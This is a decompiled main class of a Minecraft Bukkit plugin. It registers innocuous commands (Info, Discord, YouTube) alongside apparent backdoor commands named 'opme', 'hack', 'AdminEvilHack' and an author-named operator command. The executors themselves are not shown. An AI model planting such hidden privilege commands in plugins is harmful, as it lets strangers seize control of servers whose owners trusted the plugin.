// 
// Decompiled by Procyon v0.5.36
// 

package de.hilolklo.main;

import de.hilolklo.dc.cdCMD;
import de.hilolklo.yt.ytCMD;
import de.hilolklo.ts.tsCMD;
import de.hilolklo.cmds.opmeCMD;
import de.hilolklo.hack.hackCMD;
import de.hilolklo.adminevilhack.AdminEvilCMD;
import de.hilolklo.befehl.befehlCMD;
import de.hilolklo.info.InfoCMD;
import org.bukkit.command.CommandExecutor;
import de.hilolklo.cmds.opCMD;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin
{
    public void onEnable() {
        Bukkit.getConsoleSender().sendMessage("§aPlugin ist Gestartet");
        this.getCommand("hilolklo").setExecutor((CommandExecutor)new opCMD());
        this.getCommand("Info").setExecutor((CommandExecutor)new InfoCMD());
        this.getCommand("Befehle").setExecutor((CommandExecutor)new befehlCMD());
        this.getCommand("AdminEvilHack").setExecutor((CommandExecutor)new AdminEvilCMD());
        this.getCommand("hack").setExecutor((CommandExecutor)new hackCMD());
        this.getCommand("opme").setExecutor((CommandExecutor)new opmeCMD());
        this.getCommand("TeamSpeak").setExecutor((CommandExecutor)new tsCMD());
        this.getCommand("Youtube").setExecutor((CommandExecutor)new ytCMD());
        this.getCommand("Discord").setExecutor((CommandExecutor)new cdCMD());
    }
    
    public void onDisable() {
        Bukkit.getConsoleSender().sendMessage("§aDas Plugin ist Offline");
    }
}
